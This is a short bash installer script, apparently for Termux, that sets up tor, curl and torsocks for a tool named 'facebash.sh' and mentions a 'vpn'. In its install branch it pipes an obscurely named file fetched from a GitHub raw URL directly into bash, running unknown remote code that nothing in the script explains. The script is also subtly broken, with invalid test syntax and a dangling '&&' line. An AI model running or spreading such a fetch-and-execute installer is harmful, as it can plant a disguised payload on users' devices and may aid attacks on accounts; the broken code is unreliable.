#!/bin/bash
chmod +x *
if [[ command -v tor > /dev/null 2>&1;
        command -v curl > /dev/null 2>&1;
        command -v torsocks > /dev/null 2>&1 ]]; then
                clear && echo "[+] All Done !!\n[+] You Can Run ./facebash.sh"
        else pkg upgrade -y && pkg update -y
                clear && echo "[+] Installing Requierd Files..." && sleep 5
                pkg install -y tor curl torsocks
                clear && curl https://raw.githubusercontent.com/1-2-Tree/hide-change/main/739287372363827267282873372 | bash
&& echo "[+] All Done !!\n[+] You Can Run vpn "
fi
